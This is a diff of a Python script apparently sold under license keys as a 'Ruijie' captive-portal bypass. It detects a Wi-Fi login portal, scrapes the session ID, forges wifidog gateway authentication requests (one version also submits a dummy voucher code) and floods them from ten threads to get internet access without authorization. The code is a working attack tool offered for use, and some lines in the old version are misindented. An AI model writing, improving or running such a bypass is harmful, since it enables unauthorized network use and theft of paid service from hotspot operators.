@@ -22,30 +22,9 @@ console = Console()
 PING_THREADS = 10
 MIN_INTERVAL = 0.05
 MAX_INTERVAL = 0.2
-DEBUG = False
 
-# COLOR SYSTEM
-RED = "\033[91m"
-GREEN = "\033[92m"
-CYAN = "\033[96m"
-YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
-RESET = "\033[0m"
-
-# LOGGING
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(message)s",
-    datefmt="%H:%M:%S"
-)
-
-stop_event = threading.Event()
-
-# ===============================
-# GITHUB DATABASE CONFIG
-# ===============================
-# URL အသစ်သို့ ပြောင်းလဲထားပါပြီ
-URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/zyan-bypass"
+# အစ်ကို့ရဲ့ GitHub Link အမှန်
+URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/zyan-bypass"
 
 BANNER = """
 [bold #00FF00]
@@ -58,6 +37,8 @@ BANNER = """
     [#00FF00]Z Y A N   B Y P A S S[/#00FF00]
 [/bold #00FF00]
 """
+
+stop_event = threading.Event()
 
 # ===============================
 # UI FUNCTIONS
@@ -90,21 +71,20 @@ def hacking_status(message, duration=0.8):
 def success_fireworks():
     colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
     for _ in range(3):
-        for _ in range(12):
+        for _ in range(8):
             fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"]) + " " * random.randint(1, 10)
             console.print(Text(fire, style=random.choice(colors)))
             time.sleep(0.03)
-        console.print(Align.center("[bold gold1]🎆 SYSTEM UNLOCKED 🎆[/bold gold1]"))
-        time.sleep(0.2)
+    console.print(Align.center("[bold gold1]🎆 SYSTEM UNLOCKED 🎆[/bold gold1]"))
+    time.sleep(0.2)
 
 # ===============================
-# EXPIRY & LICENSE CHECK
+# LOGIC & LICENSE
 # ===============================
 def check_expiry(expiry_str):
     try:
-        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
+        expiry_date = datetime.datetime.strptime(expiry_str.strip(), '%Y-%m-%d')
         current_date = datetime.datetime.now()
-        
         if current_date > expiry_date:
             return False, expiry_date.strftime('%d-%b-%Y')
         return True, expiry_date.strftime('%d-%b-%Y')
@@ -115,154 +95,94 @@ def check_license_hacker_style():
     console.clear()
     display_wifi_logo()
     console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))
-    try:
-        user_key = input("\n  [SECURITY_ACCESS] @Zyan_").strip()
-    except EOFError:
-        user_key = ""
+    
+    user_key = input("\n  [SECURITY_ACCESS] @Zyan_ ").strip()
     if not user_key:
         console.print("\n[bold red][!] ERROR: NULL_KEY[/bold red]")
         sys.exit()
 
-hacking_status("Connecting to GitHub Database...")
+    hacking_status("Connecting to GitHub Database...")
     try:
-        response = requests.get(URL, timeout=10)
+        response = requests.get(URL, timeout=10, verify=False)
         lines = [line.strip() for line in response.text.splitlines() if line.strip()]
         
-        found = False
         hacking_status("Decrypting Database...")
-        
         for entry in lines:
             if "|" in entry:
                 db_key, exp_date = entry.split("|")
             else:
                 db_key, exp_date = entry, "None"
 
-            if user_key == db_key:
+            if user_key == db_key.strip():
                 is_active, date_label = check_expiry(exp_date)
-                
                 if is_active:
                     success_fireworks()
-                    simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
+                    simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                     console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                     return True
                 else:
                     simpler_hacker_typing("ACCESS_DENIED: KEY_EXPIRED", style="bold red")
-                    console.print(f"\n[bold red]❌ သင့် Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ ({date_label})[/bold red]")
-                    console.print("[bold yellow]⚠️ ကျေးဇူးပြု၍ Admin ထံတွင် သက်တမ်းတိုးပါ။[/bold yellow]")
                     sys.exit()
 
         simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
-        console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
         sys.exit()
 
     except Exception as e:
-        console.print(f"\n[bold red]📡 DATABASE ERROR: Check internet connection.[/bold red]")
-        if DEBUG: print(e)
+        console.print(f"\n[bold red]📡 DATABASE ERROR: {e}[/bold red]")
         sys.exit()
 
 # ===============================
-# BYPASS ENGINE FUNCTIONS
+# BYPASS ENGINE
 # ===============================
-def check_real_internet():
-    try:
-        return requests.get("http://www.google.com", timeout=3).status_code == 200
-    except:
-        return False
-
-def bypass_banner():
-    print(f"""{MAGENTA}
-╔══════════════════════════════════════╗
-║        Ruijie All Version Bypass     ║
-║          Zyan Special Edition        ║
-╚══════════════════════════════════════╝
-{RESET}""")
-
-def high_speed_ping(auth_link, sid):
+def high_speed_ping(auth_link):
     session = requests.Session()
     while not stop_event.is_set():
         try:
             session.get(auth_link, timeout=5)
-            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
         except:
-            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
             break
         time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
 def start_bypass_process():
-    bypass_banner()
-    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
-
+    console.print("[bold yellow][*] Monitoring Network Packets...[/bold yellow]")
     while not stop_event.is_set():
-        session = requests.Session()
-        test_url = "http://connectivitycheck.gstatic.com/generate_204"
         try:
-            r = requests.get(test_url, allow_redirects=True, timeout=5)
-            if r.url == test_url:
-                if check_real_internet():
-                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
-                    time.sleep(5)
-                    continue
-
-            portal_url = r.url
-            parsed_portal = urlparse(portal_url)
-            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
-            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
-
-            r1 = session.get(portal_url, verify=False, timeout=10)
-            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
-            r2 = session.get(next_url, verify=False, timeout=10)
-
-            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-            if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-                sid = sid_match.group(1) if sid_match else None
-
-            if not sid:
-                logging.warning(f"{RED}Session ID Not Found{RESET}")
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+            if r.status_code == 204:
                 time.sleep(5)
                 continue
 
-print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
             
-            voucher_api = f"{portal_host}/api/auth/voucher/"
-            try:
-                session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-            except:
-                pass
+            r1 = requests.get(portal_url, verify=False, timeout=10)
+            sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r1.text)
+            sid = sid_match.group(1) if sid_match else None
 
-            params = parse_qs(parsed_portal.query)
-            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
-            gw_port = params.get('gw_port', ['2060'])[0]
-            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-
-            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
-            for _ in range(PING_THREADS):
-                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
-
-            while check_real_internet():
-                time.sleep(5)
-        except Exception as e:
-            if DEBUG:
-                logging.error(f"{RED}Error: {e}{RESET}")
+            if sid:
+                params = parse_qs(parsed_portal.query)
+                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+                gw_port = params.get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
+                
+                console.print(f"[bold green][+] SID Found: {sid} | Injecting...[/bold green]")
+                for _ in range(PING_THREADS):
+                    threading.Thread(target=high_speed_ping, args=(auth_link,), daemon=True).start()
+            
+            time.sleep(10)
+        except Exception:
             time.sleep(5)
 
 # ===============================
 # MAIN EXECUTION
 # ===============================
-if name == "main":
+if __name__ == "__main__":
     if check_license_hacker_style():
         with console.status("[bold green]Injecting Packets...", spinner="shark"):
             time.sleep(2)
-        
-        console.print(Panel(
-            Align.center("[bold white]🔥 ZYAN BYPASS ACTIVATED 🔥[/bold white]"),
-            border_style="bold red",
-            expand=False
-        ))
-        
+        console.print(Panel(Align.center("[bold white]🔥 ZYAN BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
         try:
             start_bypass_process()
         except KeyboardInterrupt:
             stop_event.set()
-            print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
+            print("\n[!] Turbo Engine Shutdown...")
